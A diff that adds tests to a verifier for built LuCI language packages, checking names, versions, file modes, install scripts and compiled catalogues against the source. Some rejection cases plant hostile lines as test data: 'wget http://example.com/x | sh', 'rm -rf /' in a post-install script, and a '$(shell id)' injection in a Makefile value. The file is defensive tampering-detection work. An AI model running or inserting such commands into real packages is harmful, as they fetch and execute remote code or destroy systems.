@@ -150,6 +150,135 @@ test('verify_built_apk: rejects stray files, bad modes, metadata and script drif
 	}
 });
 
+/* ------------------------------------------------------- language packages */
+
+const LANGS = V.parseLuciLanguages(fs.readFileSync(path.join(ROOT, 'dev', 'i18n', 'luci-languages.mk'), 'utf8'), 'luci-languages.mk');
+
+test('verify_built_apk: luci.mk language table and package names', () => {
+	assert.deepEqual(LANGS.get('zh_Hans'), { name: '简体中文 (Simplified Chinese)', lc: 'zh-cn' });
+	assert.equal(LANGS.get('pt_BR').lc, 'pt-br');
+	assert.equal(LANGS.get('nb_NO').lc, 'no');
+	assert.equal(LANGS.get('de').lc, 'de');
+	assert.ok(!LANGS.has('templates') && !LANGS.has('en'));
+	assert.throws(() => V.parseLuciLanguages('LUCI_LANG.xx=A $(shell id)\n', 'M'), /does not model/);
+	/* the real Makefiles: distinct basenames, language packages at the package version */
+	const theme = V.parseMakefile(fs.readFileSync(path.join(ROOT, 'luci-theme-vantage', 'Makefile'), 'utf8'), 'theme');
+	const app = V.parseMakefile(fs.readFileSync(path.join(ROOT, 'luci-app-vantage', 'Makefile'), 'utf8'), 'app');
+	assert.equal(theme.basename, 'vantage-theme');
+	assert.equal(app.basename, 'vantage');
+	assert.equal(theme.poVersion, theme.fullVersion);
+	assert.equal(app.poVersion, app.fullVersion);
+	assert.equal(V.packageFileName('luci-i18n-vantage-zh-cn', '1.0.1-r2', 'apk'), 'luci-i18n-vantage-zh-cn-1.0.1-r2.apk');
+	/* the source tree as committed: every language directory is a package */
+	const defined = V.sourcePackages(ROOT, LANGS);
+	for (const [ name, p ] of defined) if (p.kind === 'lang') assert.match(name, /^luci-i18n-vantage-(theme-)?[a-z0-9-]+$/);
+});
+
+/* po2lmo stand-in: the "compiled" catalogue is the .po itself, and a
+   catalogue containing NOTRANSLATIONS compiles to nothing (as po2lmo does
+   for one without entries) */
+function fakePo2lmo(dir) {
+	const f = path.join(dir, 'po2lmo');
+	fs.writeFileSync(f, '#!/bin/sh\ngrep -q NOTRANSLATIONS "$1" && exit 0\ncat "$1" > "$2"\n', { mode: 0o755 });
+	return f;
+}
+
+const PO = 'msgid ""\nmsgstr "Content-Type: text/plain; charset=UTF-8\\n"\n\nmsgid "Log out"\nmsgstr "Abmelden"\n';
+
+/* a theme source tree with po/de/ and the language package a correct build makes */
+function langFixture(mkText = MAKEFILE.replace('LUCI_MINIFY_CSS:=0', 'LUCI_MINIFY_CSS:=0\nLUCI_BASENAME:=vantage-theme\nPKG_PO_VERSION:=$(PKG_VERSION)-r$(PKG_RELEASE)')) {
+	const src = tmp(), pkgRoot = tmp(), tools = tmp();
+	const pdir = path.join(src, 'luci-theme-vantage');
+	fs.mkdirSync(path.join(pdir, 'po', 'de'), { recursive: true });
+	fs.mkdirSync(path.join(pdir, 'po', 'templates'));
+	fs.writeFileSync(path.join(pdir, 'Makefile'), mkText);
+	fs.writeFileSync(path.join(pdir, 'po', 'de', 'vantage-theme.po'), PO);
+	fs.writeFileSync(path.join(pdir, 'po', 'templates', 'vantage-theme.pot'), 'msgid ""\nmsgstr ""\n');
+	const name = 'luci-i18n-vantage-theme-de';
+	const entries = [], dirs = new Set([ '' ]);
+	const put = (rel, body, mode) => {
+		fs.mkdirSync(path.dirname(path.join(pkgRoot, rel)), { recursive: true });
+		fs.writeFileSync(path.join(pkgRoot, rel), body);
+		entries.push({ path: rel, dir: false, mode, user: 'root', group: 'root', extra: [] });
+		for (let d = path.posix.dirname(rel); d !== '.'; d = path.posix.dirname(d)) dirs.add(d);
+	};
+	put(`etc/uci-defaults/${name}`, "uci set luci.languages.de='Deutsch (German)'; uci commit luci\n", 0o644);
+	put('usr/lib/lua/luci/i18n/vantage-theme.de.lmo', PO, 0o644);
+	put(`lib/apk/packages/${name}.list`, `/etc/uci-defaults/${name}\n/usr/lib/lua/luci/i18n/vantage-theme.de.lmo\n`, 0o644);
+	for (const d of dirs) entries.push({ path: d, dir: true, mode: 0o755, user: 'root', group: 'root', extra: [] });
+	const pkg = {
+		format: 'apk', errors: [], extraKeys: [], entries,
+		info: { name, version: '9.8.7-r3', arch: 'noarch', license: 'GPL-3.0-or-later',
+			description: 'Translation for luci-theme-vantage - Deutsch (German)',
+			depends: [ 'libc', 'luci-theme-vantage' ], provides: [ `${name}-any` ] },
+		scripts: V.expectedApkScripts({ name, script: {}, noDefaultPostinst: true }),
+	};
+	const ctx = { jsmin: null, jsminOn: false, identifiers: null, findings, langs: LANGS, po2lmo: fakePo2lmo(tools) };
+	const cleanup = () => { for (const d of [ src, pkgRoot, tools ]) fs.rmSync(d, { recursive: true, force: true }); };
+	return { src, pdir, pkgRoot, pkg, ctx, cleanup };
+}
+
+function langErrors(mutate, mkText) {
+	const f = langFixture(mkText);
+	try {
+		mutate(f);
+		return V.checkPackage(f.pkg, f.pkgRoot, f.src, f.ctx).errors;
+	} finally { f.cleanup(); }
+}
+
+test('verify_built_apk: a correct language package passes', () => {
+	assert.deepEqual(langErrors(() => {}), []);
+	const s = V.expectedApkScripts({ name: 'luci-i18n-vantage-de', script: {}, noDefaultPostinst: true });
+	assert.deepEqual(Object.keys(s).sort(), [ 'post-install', 'post-upgrade', 'pre-deinstall' ]);
+	assert.ok(s['post-install'].endsWith('add_group_and_user\ndefault_postinst\n'));
+});
+
+test('verify_built_apk: rejects language packages that differ from luci.mk and po2lmo', () => {
+	const lmo = 'usr/lib/lua/luci/i18n/vantage-theme.de.lmo';
+	const cases = [
+		[ f => { fs.appendFileSync(path.join(f.pkgRoot, lmo), 'x'); }, /vantage-theme\.de\.lmo: content differs from po2lmo/ ],
+		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'etc/uci-defaults/luci-i18n-vantage-theme-de'), 'wget http://example.com/x | sh\n'); },
+			/luci-i18n-vantage-theme-de: content differs from the line luci\.mk writes/ ],
+		[ f => { f.pkg.entries.find(e => e.path.endsWith('.lmo')).mode = 0o755; }, /mode 755, expected 644/ ],
+		[ f => { f.pkg.entries.push({ path: 'usr/lib/lua/luci/i18n/base.de.lmo', dir: false, mode: 0o644, user: 'root', group: 'root', extra: [] }); },
+			/base\.de\.lmo: in the package but not in the source/ ],
+		[ f => { f.pkg.entries = f.pkg.entries.filter(e => !e.path.endsWith('.lmo')); }, /vantage-theme\.de\.lmo: missing from the package/ ],
+		[ f => { fs.writeFileSync(path.join(f.pdir, 'po', 'de', 'vantage-theme.po'), PO + '#NOTRANSLATIONS\n'); }, /vantage-theme\.de\.lmo: in the package but not in the source/ ],
+		[ f => { f.pkg.info.depends.push('luci-base'); }, /depends/ ],
+		[ f => { f.pkg.info.version = '1.0.0-r1'; }, /version 1\.0\.0-r1, expected 9\.8\.7-r3/ ],
+		[ f => { f.pkg.info.description = 'Translation'; }, /description/ ],
+		[ f => { f.pkg.scripts['post-install'] += 'rm -rf /\n'; }, /script post-install differs/ ],
+		[ f => { f.pkg.scripts['post-deinstall'] = '#!/bin/sh\n'; }, /unexpected script post-deinstall/ ],
+		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'etc/uci-defaults/luci-i18n-vantage-theme-de'), `uci set luci.languages.de='${[ 10, 1, 2, 3 ].join('.')}'\n`); },
+			/private IPv4/ ],
+	];
+	for (const [ mutate, re ] of cases) {
+		const errs = langErrors(mutate);
+		assert.match(errs.join('\n'), re, `expected ${re}, got: ${errs.join(' | ') || 'no errors'}`);
+	}
+	/* a git-derived PKG_PO_VERSION cannot be checked */
+	assert.match(langErrors(() => {}, MAKEFILE.replace('LUCI_MINIFY_CSS:=0', 'LUCI_MINIFY_CSS:=0\nLUCI_BASENAME:=vantage-theme')).join('\n'), /PKG_PO_VERSION is unset/);
+	/* a name the source does not define (other basename, other language) */
+	assert.match(langErrors(f => { f.pkg.info.name = 'luci-i18n-vantage-de'; }).join('\n'), /unexpected package name/);
+	assert.match(langErrors(f => { f.pkg.info.name = 'luci-i18n-vantage-theme-fr'; }).join('\n'), /unexpected package name/);
+	/* a po/ directory luci.mk would skip */
+	assert.throws(() => langErrors(f => { fs.mkdirSync(path.join(f.pdir, 'po', 'en')); }), /po\/en: not a LuCI language directory/);
+});
+
+test('verify_built_apk: language packages of both packages must not share a catalogue file', () => {
+	const src = tmp();
+	try {
+		for (const name of [ 'luci-theme-vantage', 'luci-app-vantage' ]) {
+			fs.mkdirSync(path.join(src, name, 'po', 'de'), { recursive: true });
+			fs.writeFileSync(path.join(src, name, 'Makefile'), MAKEFILE.replace('luci-theme-vantage', name).replace('Package/luci-theme-vantage/', `Package/${name}/`)
+				.replace('Package/luci-theme-vantage/', `Package/${name}/`));
+			fs.writeFileSync(path.join(src, name, 'po', 'de', 'vantage.po'), PO);
+		}
+		/* same default basename "vantage" for both */
+		assert.throws(() => V.sourcePackages(src, LANGS), /defined twice|would be in both/);
+	} finally { fs.rmSync(src, { recursive: true, force: true }); }
+});
+
 /* full check of what sdk-build.sh left in dist/ */
 const DIST = path.join(ROOT, 'dist');
 const builds = fs.existsSync(DIST)
